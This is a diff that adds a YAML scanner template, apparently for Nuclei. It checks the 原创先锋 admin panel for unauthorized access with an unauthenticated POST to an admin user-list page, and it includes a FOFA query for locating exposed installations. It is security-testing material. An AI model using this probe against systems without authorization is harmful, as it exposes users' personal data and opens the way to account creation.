@@ -1,0 +1,35 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - 登录名
+            - 姓名
+            - 部门
+            - ID
+            - 共有数据
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /admin/admin/admin_list.html HTTP/1.1
+          Host: {{Hostname}}
+          Content-Type: application/json
+
+          {}
+      redirects: true
+id: yuanchuangxianfeng-admin-unauthorized
+info:
+    author: Superhero
+    description: |-
+        fofa: body="https://www.bjycxf.com"
+        原创先锋 后台管理存在未授权访问漏洞，攻击者可利用漏洞获取当前系统用户信息，甚至可以自己添加用户登录系统。
+    name: 原创先锋 后台管理未授权访问
+    reference:
+        - https://mp.weixin.qq.com/s/Ywn2ZMif4XXQX-DsBJKkQg
+    severity: high
+    tags:
+        - unauthorized
